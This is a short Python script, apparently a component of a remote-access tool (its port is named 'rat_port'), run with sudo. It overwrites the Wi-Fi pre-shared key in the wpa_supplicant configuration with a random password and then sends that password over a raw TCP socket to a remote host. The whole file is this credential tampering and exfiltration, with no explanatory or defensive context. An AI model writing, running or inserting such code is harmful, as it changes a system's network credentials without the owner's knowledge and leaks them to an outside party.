#!/usr/bin/sudo /usr/bin/python3

from random import choice
import socket
from time import sleep

from constants import *


def generate_password():
	new_password = ''
	for x in range(PASSWORD_LENGTH):
		new_password += choice(printable)

	return new_password


def edit_config(new_password):
	with open(wpa_supplicant) as f:
		lines = f.readlines()
		for i, line in enumerate(lines):
			if 'psk=' not in line:
				continue
			line = line[:line.index('psk=') + 4] + f'"{new_password}"\n'
			line_num = i
			break

	lines[line_num] = line
	with open(wpa_supplicant, 'w') as f:
		f.writelines(lines)


new_password = generate_password()
edit_config(new_password)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # noqa
s.connect((host, rat_port))

s.send(new_password.encode())

s.close()
